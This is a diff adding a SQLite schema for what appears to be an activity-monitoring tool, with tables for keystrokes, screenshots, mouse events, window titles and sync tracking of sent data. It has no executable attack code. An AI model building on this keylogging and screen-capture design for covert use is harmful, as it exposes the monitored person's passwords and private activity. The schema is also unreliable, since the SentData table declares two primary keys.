@@ -1,0 +1,33 @@
+CREATE TABLE IF NOT EXISTS ActiveWindows (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    title TEXT,
+    start_time DATETIME,
+    duration INTEGER -- in seconds
+);
+
+CREATE TABLE IF NOT EXISTS PeriodicScreenshots (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    screenshot BLOB,
+    timestamp DATETIME
+);
+
+CREATE TABLE IF NOT EXISTS Keylogger (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    start_time DATETIME,
+    keys TEXT,
+    end_time DATETIME
+);
+
+CREATE TABLE IF NOT EXISTS Mouselogger (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    move_x INTEGER,
+    move_y INTEGER,
+    mouse_click TEXT,
+    timestamp DATETIME
+);
+
+CREATE TABLE IF NOT EXISTS SentData (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    table_name TEXT PRIMARY KEY,
+    last_synced_id INTEGER   
+);
